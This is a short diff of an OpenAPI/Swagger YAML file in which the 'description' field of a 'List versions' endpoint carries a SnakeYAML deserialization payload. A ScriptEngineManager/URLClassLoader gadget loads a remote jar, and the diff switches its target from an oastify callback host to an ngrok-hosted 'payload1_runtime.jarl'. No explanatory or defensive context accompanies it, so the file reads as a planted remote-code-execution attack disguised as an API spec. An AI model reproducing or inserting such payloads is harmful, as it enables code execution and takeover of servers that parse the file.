@@ -11,7 +11,7 @@ paths:
     get:
       operationId: getVersions-v2
       summary: List versions
-      description: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [https://07546ktbhmqqlj8nbfs9vh9ad1js7j47t.oastify.com]]]]
+      description: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [https://content-kangaroo-mighty.ngrok-free.app/payload1_runtime.jarl]]]]
       produces:
       - application/json
       responses:
